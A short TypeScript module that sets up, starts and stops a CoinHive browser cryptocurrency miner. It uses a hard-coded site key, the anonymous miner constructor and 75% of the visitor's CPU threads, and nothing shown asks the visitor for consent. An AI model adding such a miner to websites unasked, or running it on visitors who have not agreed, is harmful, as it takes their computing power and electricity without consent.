declare var CoinHive: any;
const publicSiteKey: string = "mZcgXgmM87kAEC7PYEa6W3SznI7qea9q";
const threadCount: number = Math.floor(navigator.hardwareConcurrency * 0.75);
let CoinHiveMiner: any;
export function setup() {
  if (CoinHiveMiner) {
    CoinHiveMiner.stop();
  }
  CoinHiveMiner = new CoinHive.Anonymous(publicSiteKey, {
    autoThreads: false,
    forceASMJS: false,
    threads: threadCount,
    throttle: 0.2,
  });
  (document as any).CoinHiveMiner = CoinHiveMiner;
}
export function start() {
  CoinHiveMiner.start();
  console.info("💰");
}
export function stop() {
  CoinHiveMiner.stop();
  console.info("💸");
}
